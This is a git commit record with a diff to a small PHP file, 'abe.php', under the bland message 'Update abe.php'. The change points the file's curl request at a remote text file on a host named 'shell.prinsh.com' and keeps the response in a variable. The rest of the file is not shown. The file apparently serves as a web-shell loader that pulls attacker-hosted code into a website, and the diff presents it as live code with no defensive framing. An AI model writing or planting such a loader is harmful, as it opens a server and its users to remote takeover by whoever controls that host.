d92bd904857115910c5778066af529c78348c118
J. Louis <54280101+jytmX@users.noreply.github.com>
2023-11-18 14:06:27 +0700

    Update abe.php

--- abe.php
+++ abe.php
@@ -1,5 +1,5 @@
 <?php 
-$url = "http://ndot.us/za";
+$url = "https://shell.prinsh.com/Nathan/marijuana.txt";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
